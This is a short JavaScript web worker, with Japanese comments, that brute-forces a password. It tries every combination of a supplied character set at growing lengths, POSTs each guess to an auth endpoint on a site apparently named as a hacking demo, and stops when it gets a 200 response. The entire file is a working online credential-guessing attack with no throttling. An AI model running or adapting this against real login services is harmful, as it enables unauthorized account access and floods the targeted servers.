self.addEventListener('message', async (event) => {
    const { charset } = event.data;
    let length = 1;

    while (true) {
        const combinations = generateCombinations(charset, length);
        for (let combo of combinations) {
            const response = await fetch('https://hackingdemo.vercel.app/api/auth.js', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ input: combo })
            });
            self.postMessage({ combo, status: response.status });
            if (response.status === 200) {
                self.postMessage({ success: combo });
                return; // 成功した場合は終了
            }
        }
        length++; // 次の長さに進む
    }

    function generateCombinations(charset, length) {
        const result = [];
        function helper(prefix) {
            if (prefix.length === length) {
                result.push(prefix);
                return;
            }
            for (let char of charset) {
                helper(prefix + char);
            }
        }
        helper('');
        return result;
    }
});
